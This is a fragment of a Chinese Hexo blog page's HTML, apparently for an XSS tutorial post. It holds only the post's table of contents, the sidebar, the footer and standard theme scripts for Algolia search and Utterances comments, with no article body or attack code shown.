+          XSS产生原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.</span> <span class="toc-text">
+          XSS的危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E5%B8%B8%E5%87%BA%E7%8E%B0%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">4.</span> <span class="toc-text">
+          XSS常出现的地方</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.</span> <span class="toc-text">
+          XSS类型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">5.1.</span> <span class="toc-text">
+          反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">5.1.1.</span> <span class="toc-text">
+          常出现的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">5.1.2.</span> <span class="toc-text">
+          攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">5.2.</span> <span class="toc-text">
+          存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">
+          常出现的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-1"><span class="toc-number">5.2.2.</span> <span class="toc-text">
+          攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-number">5.3.</span> <span class="toc-text">
+          DOM型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%B8%B8%E7%94%A8%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-number">5.4.</span> <span class="toc-text">
+          XSS常用测试语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8XSS%E5%B9%B3%E5%8F%B0"><span class="toc-number">6.</span> <span class="toc-text">
+          XSS攻击利用XSS平台</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%B9%B3%E5%8F%B0"><span class="toc-number">6.1.</span> <span class="toc-text">
+          XSS平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">6.2.</span> <span class="toc-text">
+          手动测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#beef-xss%E5%B7%A5%E5%85%B7"><span class="toc-number">6.3.</span> <span class="toc-text">
+          beef-xss工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E9%92%93%E9%B1%BC"><span class="toc-number">6.4.</span> <span class="toc-text">
+          XSS钓鱼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81"><span class="toc-number">6.5.</span> <span class="toc-text">
+          XSS表单劫持</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">
+          XSS常见绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E9%98%B2%E5%BE%A1"><span class="toc-number">8.</span> <span class="toc-text">
+          XSS防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-lab"><span class="toc-number">9.</span> <span class="toc-text">
+          XSS-lab</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/avatar.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">冰糖小混子</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">31</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">8</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">23</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>冰糖小混子</span><span class="footer__devider">|</span><span><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">蒙ICP备20002846号</a></span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"></div><div class="search-results"><div id="algolia-hits"></div></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', function () {
+  $('.header-nav-search').on('click', function (e) {
+    e.stopPropagation();
+
+    $('body').css('overflow', 'hidden');
+    $('.search-popup')
+      .velocity('stop')
+      .velocity('transition.expandIn', {
+        duration: 300,
+        complete: function () {
+          $('.search-popup input').focus();
+        }
+      });
+    $('.search-mask')
+      .velocity('stop')
+      .velocity('transition.fadeIn', {
+        duration: 300
+      });
+  });
+
+  function closeSearch () {
+    $('body').css({ overflow: 'auto' });
+    $('.search-popup').css({ display: 'none' });
+    $('.search-mask').css({ display: 'none' });
+  }
+
+  $('.search-mask, .search-close').on('click', function () {
+    closeSearch();
+  });
+
+  $(document).on('keydown', function (e) {
+    // Escape <=> 27
+    if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+      closeSearch();
+    }
+  });
+
+  var algolia = CONFIG.algolia;
+  if (!algolia && !(algolia.appId && algolia.apiKey && algolia.indexName)) {
+    return console.error('Algolia setting is invalid.');
+  }
+
+  var search = instantsearch({
+    appId: algolia.appId,
+    apiKey: algolia.apiKey,
+    indexName: algolia.indexName,
+    searchParameters: {
+      hitsPerPage: algolia.hits.per_page || 10
+    },
+    searchFunction: function (helper) {
+      var searchInput = $('.search-input').find('input');
+
+      if (searchInput.val()) {
+        helper.search();
+      }
+    }
+  });
+
+  search.addWidget(
+    instantsearch.widgets.searchBox({
+      container: '.search-input',
+      reset: false,
+      magnifier: false,
+      placeholder: algolia.languages.inputPlaceholder
+    })
+  );
+
+  // The hits of search results.
+  search.addWidget(
+    instantsearch.widgets.hits({
+      container: '#algolia-hits',
+      templates: {
+        item: function (data) {
+          var link = data.permalink ? data.permalink : CONFIG.root + data.path;
+          return (
+            '<a href="' + link + '" class="algolia-hit-item-link">' +
+              data._highlightResult.title.value +
+            '</a>'
+          );
+        },
+        empty: function (data) {
+          return (
+            '<div id="algolia-hits-empty">' +
+              algolia.languages.hitsEmpty.replace(/\$\{query}/, data.query) +
+            '</div>'
+          );
+        }
+      },
+      cssClasses: {
+        item: 'algolia-hit-item'
+      }
+    })
+  );
+
+  // The stats of search results.
+  if ($('#algolia-stats')[0]) {
+    search.addWidget(
+      instantsearch.widgets.stats({
+        container: '#algolia-stats',
+        templates: {
+          body: function (data) {
+            var stats = algolia.languages.hitsStats
+              .replace(/\$\{hits}/, data.nbHits)
+              .replace(/\$\{time}/, data.processingTimeMS);
+            return (
+              stats +
+              '<span class="algolia-logo pull-right">' +
+                '<img src="' + CONFIG.root +
+                `${CONFIG.sourcePath.images}/algolia.svg" alt="Algolia" />` +
+              '</span>'
+            );
+          }
+        }
+      })
+    );
+  }
+
+  // The pagination of the results.
+  search.addWidget(
+    instantsearch.widgets.pagination({
+      container: '#algolia-pagination',
+      scrollTo: false,
+      showFirstLast: false,
+      labels: {
+        first: '<i class="fa fa-angle-double-left"></i>',
+        last: '<i class="fa fa-angle-double-right"></i>',
+        previous: '<i class="fa fa-angle-left"></i>',
+        next: '<i class="fa fa-angle-right"></i>'
+      },
+      cssClasses: {
+        root: 'pagination',
+        item: 'pagination-item',
+        link: 'page-number',
+        active: 'current',
+        disabled: 'disabled-item'
+      }
+    })
+  );
+
+  search.start();
+});</script><script>function loadUtterances() {
+  var d = document, s = d.createElement('script');
+  var container = d.getElementById('utterances-container');
+
+  if (!container) {
+    return;
+  }
+  s.src = 'https://utteranc.es/client.js';
+  s.setAttribute('repo', 'ixxzhi/ixxzhi.github.io');
+  s.setAttribute('issue-term', 'title');
+  s.setAttribute('label', 'utterances');
+  s.setAttribute('theme', 'github-light');
+  s.setAttribute('crossorigin', 'anonymous');
+  s.setAttribute('async', '');
+  if (false) {
+    s.setAttribute('data-pjax-rm', '');
+  }
+  container.append(s);
+}
+
+if (false) {
+  loadUtterances();
+} else {
+  window.addEventListener('DOMContentLoaded', loadUtterances, false);
+}</script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
